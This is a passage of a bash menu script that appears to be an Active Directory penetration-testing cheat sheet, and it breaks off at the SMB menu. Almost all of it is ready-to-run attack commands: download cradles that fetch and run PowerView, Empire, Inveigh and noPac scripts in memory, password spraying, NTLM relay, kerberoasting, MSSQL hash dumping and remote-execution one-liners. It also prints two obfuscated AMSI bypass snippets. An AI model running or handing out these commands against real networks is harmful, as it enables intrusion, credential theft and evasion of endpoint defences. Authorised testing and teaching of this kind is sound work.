echo -e "${IBLUE}Share Enumeration${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ShareFinder -verbose"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ShareFinder -CheckAccess"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Sharpshares.ps1);Invoke-SharpShares -Command "\"--shares"\""
echo -e ""
echo -e "${IBLUE}File Enumeration${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -verbose"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -OfficeDocs"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -Include *.ps1,*.bak,*.vbs,*.config,*.conf"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -Terms account*,pass*,secret*,conf*,test*,salar*"
echo -e ""
echo -e "${IBLUE}Snaffler${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Snaffler.ps1);Invoke-Snaffler -d domain.local"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Snaffler.ps1);Invoke-Snaffler -a -d domain.local"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Snaffler.ps1);Invoke-Snaffler -Command "\"-s -d Domain.local -o snaffler.log -v data"\""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Recon ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Privilege_Escalation() {

    clear

echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Privilege Escalation Type



        1)  ->  [ Checks 	]
        2)  ->  [ Exploits 	]
                       
        Q)  ->	[Previous Menu	]
"
        read a
        case $a in
	        1) 	Internal_Menu_Privilege_Escalation_Checks ;;
	        2) 	Internal_Menu_Privilege_Escalation_Exploits ;;
	        q|Q)	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}

Internal_Menu_Privilege_Escalation_Checks(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Privilege Escalation (Checks)${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-WinPEAS${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-winPEAS.ps1);Invoke-WinPEAS"
echo -e ""
echo -e "${IBLUE}PowerUp${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PowerUp.ps1);Invoke-AllChecks"
echo -e ""
echo -e "${IBLUE}Get-GPPPassword${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-GPPPassword.ps1);Get-GPPPassword"
echo -e ""
echo -e "${IBLUE}Grouper2${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Grouper2.ps1);Invoke-Grouper2 -Command "\"-g -f Grouper2-Report.html"\""
echo -e ""
echo -e "${IBLUE}Sherlock${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Sherlock.ps1);Find-AllVulns"
echo -e ""
echo -e "${IBLUE}PrivescCheck${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PrivescCheck.ps1);Invoke-PrivescCheck"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Privilege_Escalation ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}

Internal_Menu_Privilege_Escalation_Exploits(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Privilege Escalation (Exploits)${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-Printnightmare (LPE)${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-Printnightmare.ps1);Invoke-Nightmare"
echo -e ""
echo -e "${IBLUE}Get-System${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-System.ps1);Get-System"
echo -e ""
echo -e ""   

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Privilege_Escalation ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
          
}


Internal_Menu_MiTM_Attacks(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select MiTM Type



        1)  ->  [ Inveigh		]
                
        Q)  ->	[ Previous Menu		]
"

        read a
        case $a in
                1) 	Internal_Menu_MiTM_Inveigh ;;
        	q|Q)	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}

Internal_Menu_MiTM_Inveigh(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Inveigh${RESTORE}"
echo -e ""
echo -e "${IBLUE}Load into memory ${RESTORE}"
echo -e "$DownloadMethod "$InveighRepo"Inveigh.ps1)"
echo -e ""
echo -e "Invoke-Inveigh Y -NBNS Y -mDNS Y -HTTPS N -Proxy Y -ConsoleOutput Y -IP [Host-IP]"
echo -e ""
echo -ne "${IBLUE}Commands${RESTORE}
Get-Inveigh -Log
Get-Inveigh -NTLMv2Unique
Get-Inveigh -NTLMv2Usernames
Stop-Inveigh



"
echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_MiTM_Attacks ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        

}

Internal_Menu_Password_Spraying(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Password Spraying${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-SprayEmptyPassword${RESTORE}"
echo -e "$DownloadMethod "$S3cur3Th1sSh1tCredsRepo"/PowershellScripts/Invoke-SprayEmptyPassword.ps1);Invoke-SprayEmptyPassword"
echo -e "$DownloadMethod "$S3cur3Th1sSh1tCredsRepo"/PowershellScripts/Invoke-SprayEmptyPassword.ps1);Invoke-SprayEmptyPassword -Domain Security.local -OutFile EmptyPasswordUsers.txt"
echo -e ""
echo -e "${IBLUE}Domain Password Spray${RESTORE}"
echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray"
echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray -Password Winter2022"
echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray -UsernameAsPassword -OutFile valid-creds.txt"
echo -e ""
echo -e "${IBLUE}Rubeus${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"spray /password:Password123 /noticket /nowrap"\""
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"spray /passwords:PasswordList.txt /noticket /nowrap"\""
echo -e ""
echo -e "${IBLUE}SharpSpray${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSpray"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSpray -Command "\"--Passwords Password1,PAsSW0rd,Qwerty123"\""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}

Internal_Menu_AMSI_Bypasses(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}AMSI Bypasses${RESTORE}"
echo -e ""
echo -e "${IBLUE}Bypass #1${RESTORE}"
echo -ne '
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref]."A`ss`Embly"."GET`TY`Pe"([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'\'NonPublic,Static\'').
SetValue($null,$true)
'
echo -e ""
echo -e "${IBLUE}Bypass #2${RESTORE}"
echo -ne '
$A="5492868772801748688168747280728187173688878280688776"
$B="8281173680867656877679866880867644817687416876797271"
function C($n, $m){
[string]($n..$m|%{[char][int](29+($A+$B).
    substring(($_*2),2))})-replace " "}
$k=C 0 37; $r=C 38 51
$a=[Ref].Assembly.GetType($k)
$a.GetField($r,'\'NonPublic,Static\'').SetValue($null,$true)
'
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_CVEs(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Recent CVE's${RESTORE}"

echo -ne " What would you like to do?


	1)  ->  [ NoPac ${LYELLOW}WIP${RESTORE}	]
	
	Q)  ->	[Previous Menu	]

"
        read a
        case $a in
                1) 	Internal_Menu_CVEs_NoPac_Exploit ;;
                q|Q)	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_CVEs_NoPac_Exploit(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}NoPac (Exploit)${RESTORE}"
echo -e 
echo -e "${IBLUE}Invoke-NoPac${RESTORE}"
echo -e ""
echo -e "${YELLOW}Load into Memory${RESTORE}"
echo -e "$DownloadMethod "$InvokeNoPacRepo"Invoke-noPac.ps1);Invoke-noPac"
echo -e ""
echo -e "${YELLOW}Check${RESTORE}"
echo -e "Invoke-noPac -Command "\"scan -domain [Domain] -user [User] -pass [Password]"\""
echo -e "Invoke-noPac -Command "\"scan -domain [Domain] -user [User] -pass [Password] /enctype rc4"\""
echo -e ""
echo -e "${YELLOW}Exploit${RESTORE}"
echo -e "Invoke-noPac -Command "\"domain [Domain] -user [User] -pass [Password] /enctype rc4 /dc [DC-FQDN] /mAccount Pentest /mPassword Password /service /cifs /ptt"\""
echo -e ""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_CVEs ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}

External_Menu_Main(){

	clear

echo -e ""
echo -e ""
echo -e ""
echo -ne " What would you like to do?


	1)  ->  [ BloodHound	]
	2)  ->	[ DNS 		]
	3)  ->	[ Impacket	]
	4)  ->	[ Kerberos	]
	5)  ->	[ LDAP		]
	6)  ->	[ MiTM Attacks	]
	7)  ->	[ MSSQL		]
	8)  ->	[ NTP		]
	9)  ->	[ Nmap		]
	10) ->	[ Pywerview	]
	11) -> 	[ RDP		]
	12) ->	[ SMB		]
	13) ->	[ WinRM		]
	
	Q)  -> 	[ Options	]
        E)  -> 	[ Recent CVE's	]
"
        read a
        case $a in
                1) 	External_Menu_BloodHound ;;
                2)	External_Menu_DNS ;;
                3)	External_Menu_Impacket ;;
                4) 	External_Menu_Kerberos ;;
                5)	External_Menu_LDAP ;;
                6)	External_Menu_MiTM ;;
                7)	External_Menu_MSSQL ;;
                8)	External_Menu_NTP ;;
                9)	External_Menu_Nmap ;;
                10)	External_Menu_Pyerview ;;
                11)	External_Menu_RDP ;;
                12)	External_Menu_SMB ;;
                13)	External_Menu_WinRM ;;
                q|Q)	External_Menu_Options ;;
                e|E)	External_Menu_CVEs ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


External_Menu_BloodHound(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}BloodHound${RESTORE}"
echo -e ""
echo -e "${IBLUE}BloodHound Python${RESTORE}"
echo -e "${LYELLOW}Install:${RESTORE}pip install bloodhound"
echo -e ""
echo -e "bloodhound-python -u $Username -p $Password -ns $IP -d $Domain -c All,LoggedOn"
echo -e ""
echo -e "${IBLUE}BloodHound Crackmapexec${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M bloodhound"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}



External_Menu_DNS(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}DNS${RESTORE}"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "nmap -Pn --script dns-brute --script-args dns-brute.threads=12 $Domain $IP"
echo -e "nmap -Pn -n --script ""\"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport"\"" $IP"
echo -e ""
echo -e "${IBLUE}DNSenum${RESTORE}"
echo -e "dnsenum --dnsserver $IP --enum $Domain"
echo -e ""
echo -e "${IBLUE}DNSrecon${RESTORE}"
echo -e "dnsrecon -d $Domain"
echo -e ""
echo -e "${IBLUE}Dig${RESTORE}"
echo -e "dig AXFR $Domain @$NQIP"
echo -e "dig @$NQIP $Domain"
echo -e "dig @$NQIP $Domain A"
echo -e "dig @$NQIP $Domain AAAA"
echo -e "dig @$NQIP $Domain MX"
echo -e "dig @$NQIP $Domain NS"
echo -e "dig @$NQIP $Domain PTR"
echo -e ""
echo -e "${IBLUE}Fierce${RESTORE}"
echo -e "fierce -dns $Domain"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}


External_Menu_Impacket(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Impacket${RESTORE}"
echo -e ""
echo -e "${IBLUE}GetADUsers${RESTORE}"
echo -e "GetADUsers.py $NQDomain/$NQUsername:$Password -dc-ip $IP"
echo -e ""
echo -e "${IBLUE}GetNPUsers${RESTORE}"
echo -e "GetNPUsers.py $Domain -usersfile $UserList -dc-ip $IP -format 'hashcat'"
echo -e "GetNPUsers.py $NQDomain/$NQUsername:$Password -request -dc-ip $IP -format 'hashcat'"
echo -e ""
echo -e "${IBLUE}GetUserSPNs${RESTORE}"
echo -e "GetUserSPNs.py $NQDomain/$NQUsername:$Password -dc-ip $IP -request"
echo -e ""
echo -e "${IBLUE}lookupsid${RESTORE}"
echo -e "lookupsid.py $NQDomain/$NQUsername:$Password@$IP"
echo -e ""
echo -e "${IBLUE}samrdump${RESTORE}"
echo -e "samrdump.py $NQDomain/$NQUsername:$Password@$IP"
echo -e ""
echo -e "${IBLUE}services${RESTORE}"
echo -e "services.py $NQDomain/$NQUsername:$Password@$IP list"
echo -e ""
echo -e "${IBLUE}Execution Methods${RESTORE}"
echo -e "atexec.py $NQDomain/$NQUsername:$Password@$IP"
echo -e "psexec.py $NQDomain/$NQUsername:$Password@$IP"
echo -e "smbexec.py $NQDomain/$NQUsername:$Password@$IP"
echo -e "wmiexec.py $NQDomain/$NQUsername:$Password@$IP"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
           
}


External_Menu_Kerberos(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Kerberos${RESTORE}"
echo -e ""
echo -e "${IBLUE}Impacket${RESTORE}"
echo -e "GetNPUsers.py $Domain/ -usersfile $UserList -dc-ip $IP -format 'hashcat'"
echo -e "GetNPUsers.py $Domain/$Username:$Password -request -dc-ip $IP -format 'hashcat'"
echo -e ""
echo -e "${IBLUE}Kerbrute${RESTORE}"
echo -e "kerbrute userenum $UserList --dc $IP --domain $Domain"
echo -e "kerbrute userenum $UserListXato --dc $IP --domain $Domain"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "nmap -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=$Domain,userdb=$UserList $IP"
echo -e ""
echo -e "${IBLUE}Metasploit${RESTORE}"
echo -e "msfconsole -q -x 'use auxiliary/gather/kerberos_enumusers;set rhost $IP;set DOMAIN $Domain;set USER_FILE $UserList;exploit'"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}


External_Menu_LDAP(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}LDAP${RESTORE}"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "nmap -Pn -n -sV --script "\"ldap* and not brute"\" $IP"
echo -e ""
echo -e "${IBLUE}Crackmapexec${RESTORE}"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --admin-count"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --asreproast ASREPROAST"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --get-sid"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --gmsa"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --groups"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --kerberoasting KERBEROASTING"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --password-not-required"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --trusted-for-delegation"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --users"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain -M get-desc-users"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain -M laps"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain -M ldap-signing"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain -M daclread  -o TARGET_DN="DC=Domain,DC=Local" ACTION=read RIGHTS=DCSync"
echo -e ""
echo -e "${IBLUE}LDAPdomaindump${RESTORE}"
echo -e "ldapdomaindump -u $NQDomain\\\\\\\\$NQUsername -p $Password ldap://$NQIP"
echo -e ""
echo -e "${IBLUE}LDAPsearch${RESTORE}"
echo -e "ldapsearch -x -H ldap://$NQIP -D '$NQDomain\\\\$NQUsername' -w $Password -b "$LDAP""
echo -e "ldapsearch -x -H ldap://$NQIP -D '$NQDomain\\\\$NQUsername' -w $Password -b "$LDAP" | grep userPrincipalName | sed 's/userPrincipalName: //'"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}


External_Menu_MiTM(){

	clear

echo -e ""
echo -e ""
echo -e ""
echo -ne " What would you like to do?


	1)  ->  [ SMB Relaying	]
	
	Q)  ->	[ Previous Menu	]

        
"
        read a
        case $a in
                1) 	External_Menu_MiTM_SMB;;
                q|Q)	External_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}


External_Menu_MiTM_SMB(){

	clear

echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}SMB Relay${RESTORE}"
echo -e ""
echo -ne "${IBLUE}General Requirements${RESTORE}
- SMB Signing disabled on target
- Must be on the local network
- User credentials must have remote login access (local admin to the target machine or member of the Domain Administrators group).
"
echo -e ""
echo -ne "${IBLUE}Responder.conf configuration${RESTORE}
- SMB = Off
"
echo -e ""
echo -e "${IBLUE}#3: Check which systems do not require smb signing${RESTORE}"
echo -e "crackmapexec smb 10.10.10.0/24 --gen-relay-list targets-to-relay.txt"
echo -e "nmap --script=smb2-security-mode.nse -p 445 10.10.10.0/24 -Pn --open -oA targets-to-relay.txt"
echo -e ""
echo -e "${IBLUE}#2: Set Responder to reylay to identified systems${RESTORE}"
echo -e "sudo python3 Responder.py -I eth0 -v"
echo -e ""
echo -e "${IBLUE}#3: Set ntlmrelayx.py to relay NTLM hashes to identified systems${RESTORE}"
echo -e "sudo ntlmrelayx.py -t [IP] -smb2support --no-http-server"
echo -e "sudo ntlmrelayx.py -tf [TargetsFile] -smb2support --no-http-server"
echo -e ""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_MiTM ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}




External_Menu_MSSQL(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}MSSQL${RESTORE}"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "sudo nmap -Pn -p 1433 --script=ms-sql-info.nse $IP"
echo -e 
echo -e "${IBLUE}Crackmapexec${RESTORE}"
echo -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain --share <share_name> --get-file <remote_filename> <output_filename>"
echo -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain --share <share_name> --put-file <remote_filename> <output_filename>"
echo -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain -q <SQL_QUERY>"
echo -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain -M mssql_priv"
echo -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain -M mssql_priv -o ACTION=privesc"
echo -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain -M mssql_priv -o ACTION=rollback"
echo -n -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain -x whoami" ;echo -e " ${YELLOW}# PowerShell${RESTORE}"
echo -n -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain -X whoami" ;echo -e " ${YELLOW}# CMD${RESTORE}"
echo -e ""
echo -e "${IBLUE}Impacket${RESTORE}"
echo -e "mssqlclient.py -port 1433 $Username:$Password@$NQIP"
echo -e ""
echo -e "${IBLUE}Metasploit${RESTORE}"
echo -e "msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping;set rhosts $IP ;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum;set rhosts $IP ;set username $Username;set password $Password;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum_sql_login;set rhosts $IP ;set username $Username;set password $Password;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner;set rhosts $IP ;set username $Username;set password $Password;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as;set rhosts $IP ;set username $Username;set password $Password;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec;set rhosts $IP ;set username $Username;set password $Password;set command net user;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata ;set rhosts $IP ;set username $Username;set password $Password;set sample_size 4;set keywords FirstName|passw|credit; exploit'"
echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_sql;set rhosts $IP ;set username $Username;set password $Password;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump;set rhosts $IP ;set username $Username;set password $Password;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump;set rhosts $IP ;set username $Username;set password $Password;exploit'"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}


External_Menu_NTP(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}NTP${RESTORE}"
echo -e ""
echo -e "${IBLUE}NTPdate${RESTORE}"
echo -e "sudo ntpdate $IP"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "sudo nmap -Pn -sU -p 123 --script ntp-info $IP"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


External_Menu_Nmap(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Nmap${RESTORE}"
echo -e ""
echo -e "${IBLUE}Quick Scans${RESTORE}"
echo -n -e "nmap -Pn -sV --top-ports 50 --open $IP" ;echo -e " ${YELLOW}# Top 50 ports scan${RESTORE}"
echo -n -e "nmap -Pn -sV --top-ports 100 --open $IP" ;echo -e " ${YELLOW}# Top 100 ports scan${RESTORE}"
echo -e ""
echo -e "${IBLUE}Intensive Scans${RESTORE}"
echo -n -e "nmap -Pn -p- -sS -sV -sC -v $IP" ;echo -e " ${YELLOW}# Scan all ports, version checking, script scans${RESTORE}"
echo -e ""
echo -e "${IBLUE}Vulnerability Scans${RESTORE}"
echo -n -e "nmap -Pn --script vulners -script-args mincvss=5.0 -p- -sV -v $IP" ;echo -e " ${YELLOW}# Full vuln scan${RESTORE}"
echo -n -e "nmap -Pn --script smb-vuln* -p 139,445 -v $IP" ;echo -e " ${YELLOW}# SMB vuln scan${RESTORE}"
echo -e ""
echo -e "${IBLUE}Misc Scans${RESTORE}"
echo -n -e "nmap -Pn -sU -sC -sV -v $IP # UDP Scan" ;echo -e " ${YELLOW}# UDP Scan${RESTORE}"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}


External_Menu_Pyerview(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Pywerview${RESTORE}"
echo -e ""
echo -e "${LYELLOW}Link:${RESTORE}https://github.com/the-useless-one/pywerview"
echo -e ""
echo -e "${IBLUE}Information Gathering${RESTORE}"
echo -e "python3 pywerview.py get-dfsshare -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py get-domainpolicy -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py get-netgroup -u $Username -p $Password -w $Domain --dc-ip $IP | sed 's/samaccountname: //' | sort"
echo -e "python3 pywerview.py get-netcomputer -u $Username -p $Password -w $Domain --dc-ip $IP  | sed 's/dnshostname: //' | sort"
echo -e "python3 pywerview.py get-netdomaincontroller -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py get-netfileserver -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py get-netgpo -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py get-netgpogroup -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py get-netou -u $Username -p $Password -w $Domain --dc-ip $IP | sed 's/distinguishedname: //' | sort"
echo -e "python3 pywerview.py get-netsite -u $Username -p $Password -w $Domain --dc-ip $IP | sed 's/name: //' | sort"
echo -e "python3 pywerview.py get-netuser -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e ""
echo -e "${IBLUE}Hunting${RESTORE}"
echo -e "python3 pywerview.py invoke-eventhunter -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py invoke-processhunter -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py invoke-userhunter -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}


External_Menu_RDP(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}RDP${RESTORE}"
echo -e ""
echo -e "${IBLUE}Crackmapexec${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -M rdp -o ACTION=enable" ;echo -e " ${YELLOW}# Enable RDP${RESTORE}"
echo -n "crackmapexec rdp $IP -u $Username -p $Password --nla-screenshot"
echo -n "crackmapexec rdp $IP -u $Username -p $Password --res <Resolution>"
echo -n "crackmapexec rdp $IP -u $Username -p $Password --screenshot"
echo -n "crackmapexec rdp $IP -u $Username -p $Password --screentime"
echo -e ""
echo -e "${IBLUE}Impacket${RESTORE}"
echo -e "rdp_check.py $NQDomain/$NQUsername:$Password@$IP"
echo -e ""
echo -e "${IBLUE}xFreeRDP${RESTORE}"
echo -e "xfreerdp /v:$IP /u:$Username /p:$Password /d:$Domain"
echo -e "xfreerdp /v:$IP /u:$Username /p:$Password /d:$Domain +clipboard"
echo -e "xfreerdp /v:$IP /u:$Username /p:$Password /d:$Domain +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}


External_Menu_SMB(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}SMB${RESTORE}"
echo -e ""
